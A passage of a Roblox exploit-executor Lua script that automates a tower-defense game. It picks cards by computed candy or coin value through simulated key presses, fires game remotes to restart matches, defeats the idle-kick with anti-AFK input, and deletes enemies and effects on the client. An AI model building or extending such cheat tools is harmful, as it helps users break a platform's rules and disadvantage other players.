                    local value
                    if isSlimeRush then
                        value = calculateSlimeRushCardValue(nm, currentWave)
                    else
                        value = calculateCardValue(nm, currentWave)
                    end
                    
                    if value > bestValue then
                        bestValue = value
                        bestCard = list[i]
                    end
                end
            end
            
            if not bestCard or bestValue <= 0 or not bestCard.button then
                return false
            end
            
            local GuiService = game:GetService("GuiService")
            
            pcall(function()
                GuiService.SelectedObject = nil
            end)
            task.wait(0.3)
            
            if bestCard.button and bestCard.button:IsDescendantOf(LocalPlayer.PlayerGui) then
                pcall(function()
                    GuiService.SelectedObject = bestCard.button
                end)
            else
                return false
            end
            
            local lockConnection
            lockConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    if bestCard.button and bestCard.button.Parent and bestCard.button:IsDescendantOf(LocalPlayer.PlayerGui) and GuiService.SelectedObject ~= bestCard.button then
                        GuiService.SelectedObject = bestCard.button
                    end
                end)
            end)
            
            task.wait(0.7)
            
            local cardSelected = false
            if GuiService.SelectedObject == bestCard.button then
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                task.wait(0.1)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                cardSelected = true
                
                task.wait(0.4)
                
                if lockConnection then
                    lockConnection:Disconnect()
                end
                
                GuiService.SelectedObject = nil
            else
                if lockConnection then
                    lockConnection:Disconnect()
                end
                return false
            end
            
            getgenv().SlowerCardLastPromptId = currentSignature
            
            task.wait(0.6)
            
            local confirmButton = nil
            pcall(function()
                local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                if prompt and prompt:FindFirstChild("Frame") and prompt.Frame:FindFirstChild("Frame") then
                    local inner = prompt.Frame.Frame
                    local children = inner:GetChildren()
                    if #children >= 5 then
                        local btn = children[5]:FindFirstChild("TextButton")
                        if btn and btn:FindFirstChild("TextLabel") and btn.TextLabel.Text == "Confirm" then
                            confirmButton = btn
                        end
                    end
                end
            end)
            
            if confirmButton then
                pcall(function()
                    GuiService.SelectedObject = nil
                end)
                task.wait(0.15)
                
                if confirmButton:IsDescendantOf(LocalPlayer.PlayerGui) then
                    pcall(function()
                        GuiService.SelectedObject = confirmButton
                    end)
                else
                    return false
                end
                
                local confirmLock
                confirmLock = RunService.Heartbeat:Connect(function()
                    pcall(function()
                        if confirmButton and confirmButton.Parent and confirmButton:IsDescendantOf(LocalPlayer.PlayerGui) and GuiService.SelectedObject ~= confirmButton then
                            GuiService.SelectedObject = confirmButton
                        end
                    end)
                end)
                
                task.wait(0.4)
                
                if GuiService.SelectedObject == confirmButton then
                    VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                    task.wait(0.05)
                    VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                    
                    if confirmLock then
                        confirmLock:Disconnect()
                    end
                    
                    GuiService.SelectedObject = nil
                else
                    if confirmLock then
                        confirmLock:Disconnect()
                    end
                end
            end
            
            task.wait(0.5)
            
            local waitTime = 0
            while waitTime < 3 do
                local promptStillOpen = false
                pcall(function()
                    local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                    promptStillOpen = prompt and prompt.Enabled
                end)
                
                if not promptStillOpen then
                    break
                end
                
                task.wait(0.1)
                waitTime = waitTime + 0.1
            end
            
            if not getgenv().SlowerCardPicked then
                getgenv().SlowerCardPicked = {}
            end
            table.insert(getgenv().SlowerCardPicked, bestCard.name)
            
            return true
        end)
        
        if not ok then
            warn("[Slower Card] ❌ Error:", result)
        end
        
        return ok and result
    end
    
    if not getgenv().SmartCardPicked then
        getgenv().SmartCardPicked = {}
    end
    
    if not getgenv().SmartCardLastPromptId then
        getgenv().SmartCardLastPromptId = nil
    end
    
    if not getgenv().SlowerCardPicked then
        getgenv().SlowerCardPicked = {}
    end
    
    if not getgenv().SlowerCardLastPromptId then
        getgenv().SlowerCardLastPromptId = nil
    end
    
    local function getPromptSignature()
        local ok, signature = pcall(function()
            local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
            if not prompt or not prompt.Enabled then
                return nil
            end
            
            local list = getAvailableCards()
            if not list or #list == 0 then
                return nil
            end
            
            local cardNames = {}
            for _, card in ipairs(list) do
                table.insert(cardNames, card.name)
            end
            table.sort(cardNames)
            
            return table.concat(cardNames, "|")
        end)
        return ok and signature or nil
    end
    
    local function calculateSlimeRushCardValue(cardName, currentWave)
        local blacklistedCards = {
            ["Sacrifice"] = true,
        }
        
        if blacklistedCards[cardName] then
            return -999999999
        end
        
        local cardDefinitions = {
            ["Blinded I"] = {type = "wave", coinsPerWave = 2},
            ["Blinded II"] = {type = "wave", coinsPerWave = 5},
            
            ["Intimidation I"] = {type = "kill", coinsPerKill = 2},
            ["Intimidation II"] = {type = "kill", coinsPerKill = 3},
            ["Obstruction I"] = {type = "kill", coinsPerKill = 2},
            ["Obstruction II"] = {type = "kill", coinsPerKill = 3},
            
            ["Restriction I"] = {type = "boss", coinsPerBoss = 50},
            ["Restriction II"] = {type = "boss", coinsPerBoss = 100},
            
            ["Prevention I"] = {type = "finalboss", coinsOnFinal = 250},
            ["Prevention II"] = {type = "finalboss", coinsOnFinal = 500},
            
            ["Hasty I"] = {type = "buff", value = 100},
            ["Hasty II"] = {type = "buff", value = 150},
            ["Precision I"] = {type = "buff", value = 80},
            ["Precision II"] = {type = "buff", value = 120},
            ["True Sight I"] = {type = "buff", value = 90},
            ["True Sight II"] = {type = "buff", value = 130},
            ["Momentum"] = {type = "buff", value = 110},
            ["Fiery Surge I"] = {type = "buff", value = 85},
            ["Fiery Surge II"] = {type = "buff", value = 125},
            ["Hellish Warp I"] = {type = "buff", value = 95},
            ["Hellish Warp II"] = {type = "buff", value = 140},
            ["Entrepreneur"] = {type = "buff", value = 200},
        }
        
        local cardData = cardDefinitions[cardName]
        if not cardData then
            return -999999
        end
        
        local userPriority = (getgenv().SlimeRushCardPriority and getgenv().SlimeRushCardPriority[cardName]) or 1
        if userPriority >= 999 then
            return -999999
        end
        
        local TOTAL_WAVES = 50
        local TOTAL_ENEMIES = 899
        local TOTAL_BOSSES = 4
        
        local wavesRemaining = math.max(1, TOTAL_WAVES - currentWave + 1)
        
        local currentKills = 0
        pcall(function()
            currentKills = game:GetService("Players").LocalPlayer.leaderstats.Kills.Value
        end)
        
        local enemiesRemaining = math.max(1, TOTAL_ENEMIES - currentKills)
        local bossesRemaining = math.max(0, TOTAL_BOSSES - math.floor(currentWave / 12))
        
        local totalCoinValue = 0
        
        if cardData.type == "wave" then
            totalCoinValue = cardData.coinsPerWave * wavesRemaining
        elseif cardData.type == "kill" then
            totalCoinValue = cardData.coinsPerKill * enemiesRemaining
        elseif cardData.type == "boss" then
            totalCoinValue = cardData.coinsPerBoss * bossesRemaining
        elseif cardData.type == "finalboss" then
            totalCoinValue = currentWave < 50 and cardData.coinsOnFinal or 0
        elseif cardData.type == "buff" then
            return -999999
        end
        
        local priorityMultiplier = 1000 / math.max(1, userPriority)
        totalCoinValue = totalCoinValue * priorityMultiplier
        
        return totalCoinValue
    end
    
    local function calculateCardValue(cardName, currentWave)
        local blacklistedCards = {
            ["Devil's Sacrifice"] = true, 
        }
        
        if blacklistedCards[cardName] then
            return -999999999 
        end
        
        local cardDefinitions = {
            ["Critical Denial"] = {type = "wave", candyPerWave = 100},
            ["Weakened Resolve III"] = {type = "wave", candyPerWave = 50},
            ["Fog of War III"] = {type = "wave", candyPerWave = 50},
            ["Weakened Resolve II"] = {type = "wave", candyPerWave = 25},
            ["Fog of War II"] = {type = "wave", candyPerWave = 25},
            ["Power Reversal II"] = {type = "wave", candyPerWave = 25},
            ["Greedy Vampire's"] = {type = "wave", candyPerWave = 25},
            ["Weakened Resolve I"] = {type = "wave", candyPerWave = 15},
            ["Fog of War I"] = {type = "wave", candyPerWave = 15},
            ["Power Reversal I"] = {type = "wave", candyPerWave = 15},
            
            ["Lingering Fear II"] = {type = "kill", bonusCandyPerKill = 2},
            ["Hellish Gravity"] = {type = "kill", bonusCandyPerKill = 2},
            ["Lingering Fear I"] = {type = "kill", bonusCandyPerKill = 1},
            ["Deadly Striker"] = {type = "kill", bonusCandyPerKill = 1},
            
            ["Trick or Treat Coin Flip"] = {type = "special", treatValue = 5000},
        }
        
        local cardData = cardDefinitions[cardName]
        if not cardData then
            local isCandyCard = getgenv().CandyCards and getgenv().CandyCards[cardName] ~= nil
            if not isCandyCard then
                return -999999
            end
            cardData = {type = "wave", candyPerWave = 20}
        end
        
        local userPriority = (getgenv().CardPriority and getgenv().CardPriority[cardName]) or 1
        if userPriority >= 999 then
            return -999999
        end
        
        local TOTAL_WAVES = 50
        local TOTAL_ENEMIES = 1350
        
        local wavesRemaining = math.max(1, TOTAL_WAVES - currentWave + 1)
        
        local currentKills = 0
        pcall(function()
            currentKills = game:GetService("Players").LocalPlayer.leaderstats.Kills.Value
        end)
        
        local enemiesRemaining = math.max(1, TOTAL_ENEMIES - currentKills)
        
        local totalCandyValue = 0
        
        if cardData.type == "wave" then
            totalCandyValue = cardData.candyPerWave * wavesRemaining
            
        elseif cardData.type == "kill" then
            totalCandyValue = cardData.bonusCandyPerKill * enemiesRemaining
            
        elseif cardData.type == "special" and cardName == "Trick or Treat Coin Flip" then
            if wavesRemaining >= 40 then
                totalCandyValue = 2500
            elseif wavesRemaining >= 30 then
                totalCandyValue = 2000
            elseif wavesRemaining >= 20 then
                totalCandyValue = 1500
            else
                totalCandyValue = 1000
            end
        end
        
        local priorityMultiplier = 1.0 / (1.0 + (userPriority - 1) * 0.05)
        totalCandyValue = totalCandyValue * priorityMultiplier
        
        return totalCandyValue
    end
    
    local function selectCardSmart()
        local isSlimeRush = false
        pcall(function()
            local gamemode = RS:FindFirstChild("Gamemode")
            if gamemode and gamemode.Value == "SlimeRush" then
                isSlimeRush = true
            end
        end)
        
        if isSlimeRush then
            if not getgenv().SlimeRushSmartCardSelectionEnabled then
                return false
            end
        else
            if not getgenv().SmartCardSelectionEnabled then 
                return false 
            end
        end
        
        local ok, result = pcall(function()
            local currentSignature = getPromptSignature()
            if not currentSignature then
                return false
            end
            
            if getgenv().SmartCardLastPromptId == currentSignature then
                return false
            end
            
            local currentWave = 0
            pcall(function()
                local wave = RS:FindFirstChild("Wave")
                if wave and wave.Value then
                    currentWave = wave.Value
                end
            end)
            
            local list = getAvailableCards()
            if not list or #list == 0 then 
                print("[Smart Card] ❌ No cards detected in UI")
                return false 
            end
            
            local alreadyPicked = {}
            for _, pickedName in ipairs(getgenv().SmartCardPicked) do
                alreadyPicked[pickedName] = true
            end
            
            local candyCards = {}
            local nonCandyCards = {}
            
            print("[Smart Card] Wave " .. currentWave .. " - Evaluating " .. #list .. " cards:")
            
            for i = 1, #list do
                local cardName = list[i].name
                local button = list[i].button
                
                if not alreadyPicked[cardName] then
                    local value
                    if isSlimeRush then
                        value = calculateSlimeRushCardValue(cardName, currentWave)
                    else
                        value = calculateCardValue(cardName, currentWave)
                    end
                    
                    if value > -999999 then
                        table.insert(candyCards, {
                            name = cardName,
                            button = button,
                            value = value
                        })
                        local valueLabel = isSlimeRush and " coins" or " candy"
                        print("  ✅ " .. cardName .. " = " .. math.floor(value) .. valueLabel)
                    else
                        table.insert(nonCandyCards, cardName)
                        print("  ❌ " .. cardName .. " = SKIPPED")
                    end
                end
            end
            
            table.sort(candyCards, function(a, b)
                return a.value > b.value
            end)
            
            if #candyCards == 0 then
                print("[Smart Card] ⚠️ WARNING: No valid candy cards found! Available cards:")
                for _, name in ipairs(nonCandyCards) do
                    print("    - " .. name)
                end
                return false
            end
            
            local bestCard = candyCards[1]
            print("[Smart Card] 🎯 SELECTING: " .. bestCard.name .. " (" .. math.floor(bestCard.value) .. " candy)")
            
            if not bestCard.button or not bestCard.button:IsDescendantOf(LocalPlayer.PlayerGui) then
                print("[Smart Card] ❌ Button not valid or not in PlayerGui")
                return false
            end
            
            pcall(function()
                local GuiService = game:GetService("GuiService")
                pcall(function()
                    GuiService.SelectedObject = nil
                end)
                task.wait(0.1)
                
                if bestCard.button and bestCard.button:IsDescendantOf(LocalPlayer.PlayerGui) then
                    pcall(function()
                        GuiService.SelectedObject = bestCard.button
                    end)
                    task.wait(0.2)
                    
                    VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                    task.wait(0.05)
                    VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                    
                    print("[Smart Card] ✓ Card clicked via GuiService")
                end
            end)
            
            task.wait(0.3)
            
            local confirmSuccess = pressConfirm()
            if confirmSuccess then
                print("[Smart Card] ✓ Confirm button pressed")
            end
            
            task.wait(0.2)
            
            getgenv().SmartCardLastPromptId = currentSignature
            
            table.insert(getgenv().SmartCardPicked, bestCard.name)
            print("[Smart Card] 📝 Picked: " .. bestCard.name .. " (Total picked: " .. #getgenv().SmartCardPicked .. "/5)")
            
            return true
        end)
        
        if not ok then
            warn("[Smart Card] ⚠️ Error:", result)
        end
        
        return ok and result
    end
    
    while true do
        task.wait(1)
        
        local promptVisible = false
        pcall(function()
            local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
            if prompt and prompt.Enabled then
                promptVisible = true
            end
        end)
        
        if not promptVisible then
            task.wait(0.3)
            continue
        end
        
        local gamemodeValue = "Unknown"
        pcall(function()
            local gamemode = RS:FindFirstChild("Gamemode")
            if gamemode then
                gamemodeValue = tostring(gamemode.Value)
            end
        end)
        
        print("[Card Selection] Gamemode detected:", gamemodeValue)
        
        local isBossRush = gamemodeValue == "BossRush"
        local isSlimeRush = gamemodeValue:find("Slime") or gamemodeValue == "SlimeRush"
        local isMidnightHunt = gamemodeValue == "MidnightHunt"
        local isInfinite = gamemodeValue == "Infinite"
        
        if isBossRush and getgenv().BossRushEnabled then
            selectCard()
        elseif isSlimeRush then
            print("[Card Selection] Slime Rush detected, checking toggles...")
            print("[Card Selection] SlimeRushEnabled:", getgenv().SlimeRushEnabled)
            print("[Card Selection] Fast:", getgenv().SlimeRushCardSelectionEnabled)
            print("[Card Selection] Slower:", getgenv().SlimeRushSlowerCardSelectionEnabled)
            print("[Card Selection] Smart:", getgenv().SlimeRushSmartCardSelectionEnabled)
            
            if getgenv().SlimeRushEnabled then
                if getgenv().SlimeRushCardSelectionEnabled then
                    print("[Card Selection] Using Fast Mode")
                    selectCard()
                elseif getgenv().SlimeRushSlowerCardSelectionEnabled then
                    print("[Card Selection] Using Slower Mode")
                    selectCardSlower()
                elseif getgenv().SlimeRushSmartCardSelectionEnabled then
                    print("[Card Selection] Using Smart Mode")
                    selectCardSmart()
                end
            end
        elseif isMidnightHunt or isInfinite then
            if getgenv().CardSelectionEnabled then
                print("[Card Selection] Using Fast Mode for " .. gamemodeValue)
                selectCard()
            elseif getgenv().SlowerCardSelectionEnabled then
                print("[Card Selection] Using Slower Mode for " .. gamemodeValue)
                selectCardSlower()
            elseif getgenv().SmartCardSelectionEnabled then
                print("[Card Selection] Using Smart Mode for " .. gamemodeValue)
                selectCardSmart()
            end
        end
    end
    end)
end


getgenv().SeamlessRestartManager = getgenv().SeamlessRestartManager or {
    roundCount = 0,
    maxRounds = 4,
    enabled = false,
    isRestarting = false,
    lastRoundEndTime = 0,
    roundHistory = {}
}

local function isSeamlessEnabled()
    local enabled = false
    pcall(function()
        local settings = LocalPlayer.PlayerGui:FindFirstChild("Settings")
        if settings then
            local seamless = settings:FindFirstChild("SeamlessRetry")
            if seamless then 
                enabled = seamless.Value
            end
        end
    end)
    return enabled
end

local function enableSeamlessRetry()
    local currentlyEnabled = isSeamlessEnabled()
    if currentlyEnabled then
        return true
    end
    
    local success = false
    pcall(function()
        local remotes = RS:FindFirstChild("Remotes")
        local setSettings = remotes and remotes:FindFirstChild("SetSettings")
        if setSettings then 
            setSettings:InvokeServer("SeamlessRetry")
            success = true
        end
    end)
    return success
end

local function disableSeamlessRetry()
    local currentlyEnabled = isSeamlessEnabled()
    if not currentlyEnabled then
        return true
    end
    
    local success = false
    pcall(function()
        local remotes = RS:FindFirstChild("Remotes")
        local setSettings = remotes and remotes:FindFirstChild("SetSettings")
        if setSettings then 
            setSettings:InvokeServer("SeamlessRetry")
            success = true
        end
    end)
    return success
end

local function performFullRestart()
    local manager = getgenv().SeamlessRestartManager
    manager.isRestarting = true
    
    print("[Seamless] Max rounds (" .. manager.maxRounds .. ") reached, performing full restart...")
    
    if getgenv().MacroPlaybackActive then
        getgenv().MacroPlaybackActive = false
    end
    
    pcall(function() collectgarbage("collect") end)
    task.wait(1)
    
    local success = false
    pcall(function()
        local remotes = RS:FindFirstChild("Remotes")
        local restartEvent = remotes and remotes:FindFirstChild("RestartMatch")
        if restartEvent then
            restartEvent:FireServer()
            success = true
            print("[Seamless] Restart event fired")
        end
    end)
    
    if success then
        task.wait(5)
        
        local waitTime = 0
        local maxWait = 30
        while waitTime < maxWait do
            local state = getgenv().GameState
            if state.gameStarted and not state.gameEnded and state.wave == 1 then
                print("[Seamless] Game restarted successfully")
                manager.roundCount = 0
                manager.isRestarting = false
                manager.roundHistory = {}
                
                if getgenv().SeamlessFixEnabled then
                    task.wait(2)
                    enableSeamlessRetry()
                end
                return true
            end
            task.wait(0.5)
            waitTime = waitTime + 0.5
        end
        
        print("[Seamless] WARNING: Restart timeout after " .. maxWait .. "s")
    end
    
    manager.isRestarting = false
    return false
end

if not isInLobby then
    task.spawn(function()
        local manager = getgenv().SeamlessRestartManager
        local state = getgenv().GameState
        
        local maxWait = 0
        repeat 
            task.wait(0.5) 
            maxWait = maxWait + 0.5 
        until LocalPlayer.PlayerGui:FindFirstChild("Settings") or maxWait > 10
        
        if getgenv().DebugMode then
            print("[Seamless] Monitor started")
        end
        
        local function updateSeamlessSettings()
            if not getgenv().SeamlessFixEnabled then return end
            
            local maxRounds = tonumber(getgenv().SeamlessRounds) or 4
            manager.maxRounds = maxRounds
            
            local currentlyEnabled = isSeamlessEnabled()
            
            if manager.roundCount >= maxRounds then
                if currentlyEnabled then
                    disableSeamlessRetry()
                    task.wait(0.3)
                    if isSeamlessEnabled() then
                        disableSeamlessRetry()
                        task.wait(0.3)
                    end
                end
                return
            end
            
            if manager.roundCount < maxRounds and not currentlyEnabled then
                enableSeamlessRetry()
            end
        end
        
        updateSeamlessSettings()
        
        local lastSettingsCheck = 0
        local lastGameStartedState = true
        local hasCountedRound = false
        
        task.spawn(function()
            while true do
                task.wait(0.5)
                if getgenv().SeamlessFixEnabled and manager.roundCount >= manager.maxRounds then
                    if isSeamlessEnabled() then
                        for i = 1, 2 do
                            disableSeamlessRetry()
                            task.wait(0.3)
                            if not isSeamlessEnabled() then
                                break
                            end
                        end
                    end
                end
            end
        end)
        
        local seamlessValueConnection
        task.spawn(function()
            task.wait(2)
            pcall(function()
                local settings = LocalPlayer.PlayerGui:WaitForChild("Settings", 10)
                if settings then
                    local seamlessValue = settings:WaitForChild("SeamlessRetry", 5)
                    if seamlessValue then
                        seamlessValueConnection = seamlessValue:GetPropertyChangedSignal("Value"):Connect(function()
                            if getgenv().SeamlessFixEnabled and manager.roundCount >= manager.maxRounds then
                                if seamlessValue.Value == true then
                                    task.wait(0.1)
                                    disableSeamlessRetry()
                                end
                            end
                        end)
                    end
                end
            end)
        end)
        
        while true do
            task.wait(0.3)
            
            if tick() - lastSettingsCheck > 2 then
                updateSeamlessSettings()
                lastSettingsCheck = tick()
            end
            
            if not getgenv().SeamlessFixEnabled then
                task.wait(2)
                continue
            end
            
            pcall(function()
                local state = getgenv().GameState
                
                local currentGameStarted = false
                pcall(function()
                    local gs = RS:FindFirstChild("GameStarted")
                    if gs and gs.Value ~= nil then
                        currentGameStarted = gs.Value
                    end
                end)

                
                if lastGameStartedState and not currentGameStarted and not hasCountedRound then
                    local now = tick()
                    
                    print("[Seamless] 🔄 GameStarted went false (seamless transition detected)")
                    
                    if now - manager.lastRoundEndTime >= 3 then
                        manager.lastRoundEndTime = now
                        manager.roundCount = manager.roundCount + 1
                        getgenv()._SeamlessEndgameCount = manager.roundCount
                        table.insert(manager.roundHistory, now)
                        hasCountedRound = true
                        
                        print("[Seamless] ✅ Round counted! Total: " .. manager.roundCount .. "/" .. manager.maxRounds)
                        
                        task.spawn(function()
                            task.wait(5)
                            hasCountedRound = false
                            print("[Seamless] Round counter debounce reset")
                        end)
                        
                        if manager.roundCount >= manager.maxRounds then
                            print("[Seamless] Max rounds reached - Disabling seamless and preparing restart...")
                            
                            for i = 1, 5 do
                                if isSeamlessEnabled() then
                                    disableSeamlessRetry()
                                    task.wait(0.5)
                                    if not isSeamlessEnabled() then
                                        break
                                    end
                                else
                                    break
                                end
                            end
                            
                            task.spawn(function()
                                local waitTime = 0
                                while LocalPlayer.PlayerGui:FindFirstChild("EndGameUI") and waitTime < 30 do
                                    task.wait(0.5)
                                    waitTime = waitTime + 0.5
                                end
                                
                                task.wait(2)
                                performFullRestart()
                            end)
                        else
                            task.spawn(function()
                                task.wait(2)
                                updateSeamlessSettings()
                            end)
                        end
                    else
                        print("[Seamless] ⏭️ Skipped count (debounce: " .. string.format("%.1f", now - manager.lastRoundEndTime) .. "s since last)")
                    end
                end
                
                lastGameStartedState = currentGameStarted
                
                if state.roundJustEnded then
                    local now = tick()
                    
                    if now - manager.lastRoundEndTime < 3 then
                        return
                    end
                    
                    manager.lastRoundEndTime = now
                    manager.roundCount = manager.roundCount + 1
                    table.insert(manager.roundHistory, now)
                    
                    print("[Seamless] Round ended - Count: " .. manager.roundCount .. "/" .. manager.maxRounds)
                    
                    if manager.roundCount >= manager.maxRounds then
                        task.spawn(function()
                            task.wait(5)
                            
                            if isSeamlessEnabled() then
                                disableSeamlessRetry()
                                task.wait(1)
                            end
                            
                            local waitTime = 0
                            while LocalPlayer.PlayerGui:FindFirstChild("EndGameUI") and waitTime < 30 do
                                task.wait(0.5)
                                waitTime = waitTime + 0.5
                            end
                            
                            task.wait(2)
                            performFullRestart()
                        end)
                    else
                        updateSeamlessSettings()
                    end
                end
                
                if state.isNewRound then
                    local now = tick()
                    
                    if now - manager.lastRoundEndTime >= 3 and not hasCountedRound then
                        manager.lastRoundEndTime = now
                        manager.roundCount = manager.roundCount + 1
                        getgenv()._SeamlessEndgameCount = manager.roundCount
                        table.insert(manager.roundHistory, now)
                        hasCountedRound = true
                        
                        print("[Seamless] New round detected - Count: " .. manager.roundCount .. "/" .. manager.maxRounds)
                        
                        task.spawn(function()
                            task.wait(5)
                            hasCountedRound = false
                        end)
                        
                        if manager.roundCount >= manager.maxRounds then
                            print("[Seamless] Max rounds reached - Preparing full restart...")
                            
                            for i = 1, 5 do
                                if isSeamlessEnabled() then
                                    disableSeamlessRetry()
                                    task.wait(0.5)
                                    if not isSeamlessEnabled() then
                                        break
                                    end
                                else
                                    break
                                end
                            end
                            
                            task.spawn(function()
                                local waitTime = 0
                                while LocalPlayer.PlayerGui:FindFirstChild("EndGameUI") and waitTime < 30 do
                                    task.wait(0.5)
                                    waitTime = waitTime + 0.5
                                end
                                
                                task.wait(2)
                                performFullRestart()
                            end)
                        end
                    end
                    
                    task.spawn(function()
                        task.wait(2)
                        pcall(function()
                            local elapsed = RS:FindFirstChild("ElapsedTime")
                            if elapsed and elapsed.Value then
                                getgenv()._RoundStartTime = elapsed.Value
                            end
                        end)
                    end)
                    
                    updateSeamlessSettings()
                    
                    if manager.roundCount < manager.maxRounds then
                        print("[Macro] ✅ GameStarted = true detected, restarting macro now!")
                        
                        task.spawn(function()
                            task.wait(1)
                            
                            if getgenv().MacroPlaybackActive then
                                getgenv().MacroPlaybackActive = false
                                task.wait(0.5)
                            end
                            
                            getgenv()._MacroSeamlessRestart = true
                            getgenv()._MacroProgressDetected = false
                            getgenv().MacroGameState.gameEnded = false
                            getgenv().MacroGameState.hasEndGameUI = false
                            getgenv().MacroGameState.lastGameEndedState = false
                            
                            task.wait(0.5)
                            
                            if getgenv().MacroPlayEnabled and getgenv().CurrentMacro then
                                playMacroV2()
                            end
                            
                            task.delay(3, function()
                                getgenv()._MacroSeamlessRestart = false
                            end)
                        end)
                    end
                end
                
                local teleportUI = LocalPlayer.PlayerGui:FindFirstChild("TeleportUI")
                if teleportUI and teleportUI.Enabled then
                    if manager.roundCount >= manager.maxRounds then
                        manager.roundCount = 0
                        manager.roundHistory = {}
                        manager.isRestarting = false
                        task.wait(2)
                        updateSeamlessSettings()
                    end
                end
            end)
        end
    end)
end


do
    task.spawn(function()
        local vu = game:GetService("VirtualUser")
        
        Players.LocalPlayer.Idled:Connect(function()
            if getgenv().AntiAFKEnabled then
                vu:CaptureController()
                vu:ClickButton2(Vector2.new())
            end
        end)
        
        task.spawn(function()
            while true do
                task.wait(60)
                if getgenv().AntiAFKEnabled then
                    pcall(function()
                        vu:CaptureController()
                        vu:ClickButton2(Vector2.new())
                    end)
                end
            end
        end)
        
        task.spawn(function()
            while true do
                task.wait(120)
                if getgenv().AntiAFKEnabled then
                    pcall(function()
                        local char = LocalPlayer.Character
                        if char and char:FindFirstChild("HumanoidRootPart") then
                            local hrp = char.HumanoidRootPart
                            hrp.CFrame = hrp.CFrame * CFrame.new(0, 0.1, 0)
                            task.wait(0.1)
                            hrp.CFrame = hrp.CFrame * CFrame.new(0, -0.1, 0)
                        end
                    end)
                end
            end
        end)
    end)
end

do
    task.spawn(function()
        while true do
            task.wait(300) 
            
            pcall(function()
                if towerTracker and towerTracker.upgradeConnections then
                    for tower, conn in pairs(towerTracker.upgradeConnections) do
                        if not tower or not tower.Parent then
                            if conn then conn:Disconnect() end
                            towerTracker.upgradeConnections[tower] = nil
                        end
                    end
                end
                
                if getgenv()._DynamicSummonSections then
                    for unitName, data in pairs(getgenv()._DynamicSummonSections) do
                        local stillExists = false
                        if workspace:FindFirstChild("Towers") then
                            for _, tower in pairs(workspace.Towers:GetChildren()) do
                                if tower.Name == unitName then
                                    local owner = tower:FindFirstChild("Owner")
                                    if owner and owner.Value == LocalPlayer then
                                        stillExists = true
                                        break
                                    end
                                end
                            end
                        end
                        
                        if not stillExists and data.elements then
                            for _, element in ipairs(data.elements) do
                                pcall(function()
                                    if element and element.SetVisiblity then
                                        element:SetVisiblity(false)
                                    end
                                end)
                            end
                            getgenv()._DynamicSummonSections[unitName] = nil
                        end
                    end
                end
                
                safeGarbageCollect()
            end)
        end
    end)
end

do
    task.spawn(function()
        local blackScreenGui, blackFrame
    
    local function createBlack()
        if blackScreenGui then return end
        
        blackScreenGui = Instance.new("ScreenGui")
        blackScreenGui.Name = "BlackScreenOverlay"
        blackScreenGui.DisplayOrder = -999999
        blackScreenGui.IgnoreGuiInset = true
        blackScreenGui.ResetOnSpawn = false
        
        blackFrame = Instance.new("Frame")
        blackFrame.Size = UDim2.new(1, 0, 1, 0)
        blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
        blackFrame.BorderSizePixel = 0
        blackFrame.ZIndex = -999999
        blackFrame.Parent = blackScreenGui
        
        pcall(function()
            blackScreenGui.Parent = LocalPlayer.PlayerGui
        end)
        
        pcall(function()
            if workspace.CurrentCamera then
                workspace.CurrentCamera.MaxAxisFieldOfView = 0.001
            end
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        end)
        
    end
    
    local function removeBlack()
        if blackScreenGui then
            blackScreenGui:Destroy()
            blackScreenGui = nil
            blackFrame = nil
        end
        
        pcall(function()
            if workspace.CurrentCamera then
                workspace.CurrentCamera.MaxAxisFieldOfView = 70
            end
        end)
        
    end
    
    while true do
        task.wait(0.5)
        if getgenv().BlackScreenEnabled then
            if not blackScreenGui then
                createBlack()
            end
        else
            if blackScreenGui then
                removeBlack()
            end
        end
    end
    end)
end

do
    task.spawn(function()
        local removeInterval = getgenv().IsMacPlatform and 1 or 0.5
        while true do
            task.wait(removeInterval) 
            if getgenv().RemoveEnemiesEnabled then
                pcall(function()
                    local enemies = workspace:FindFirstChild("Enemies")
                    if enemies then
                        local enemyList = enemies:GetChildren()
                        local batchSize = getgenv().IsMacPlatform and 5 or 10
                        local maxEnemies = getgenv().IsMacPlatform and 50 or #enemyList
                        
                        for i = 1, math.min(#enemyList, maxEnemies) do
                            local enemy = enemyList[i]
                            pcall(function()
                                if enemy and enemy.Parent and enemy:IsA("Model") then
                                    local isBoss = enemy:FindFirstChild("Boss")
                                    if not isBoss or not isBoss.Value then
                                        enemy:Destroy()
                                    end
                                end
                            end)
                            if i % batchSize == 0 then
                                task.wait()
                            end
                        end
                    end
                    
                    local spawnedunits = workspace:FindFirstChild("SpawnedUnits")
                    if spawnedunits then
                        local unitList = spawnedunits:GetChildren()
                        for i = 1, #unitList do
                            local su = unitList[i]
                            pcall(function()
                                if su and su.Parent and su:IsA("Model") then
                                    su:Destroy()
                                end
                            end)
                            if i % 10 == 0 then
                                task.wait()
                            end
                        end
                    end
                    
                    local debris = workspace:FindFirstChild("Debris")
                    if debris then
                        local debrisList = debris:GetChildren()
                        for i = 1, #debrisList do
                            pcall(function() 
                                if debrisList[i] then
                                    debrisList[i]:Destroy()
                                end
                            end)
                        end
                    end
                end)
            end
        end
    end)
end

if getgenv().AutoHideUIEnabled or getgenv().Config.toggles.AutoHideUI then
    task.spawn(function()
        task.wait(3)
        
        if Window and Window.SetState then
            pcall(function()
                Window:SetState(false)
            end)
        end
    end)
end

if not isInLobby then
    task.spawn(function()
        local particleInterval = getgenv().IsMacPlatform and 4 or 2
        while true do
            task.wait(particleInterval)
            pcall(function()
                local targets = {workspace.Enemies, workspace.Towers, workspace:FindFirstChild("Effects")}
                for _, parent in pairs(targets) do
                    if parent then
                        for _, obj in pairs(parent:GetDescendants()) do
                            pcall(function()
                                if obj:IsA("ParticleEmitter") then
                                    if obj.Rate > 100 then 
                                        obj.Enabled = false
                                        obj:Destroy()
                                    end
                                elseif obj:IsA("Trail") or obj:IsA("Beam") then
                                    obj.Enabled = false
                                elseif obj:IsA("Sound") then
                                    if obj.Volume > 0.5 then
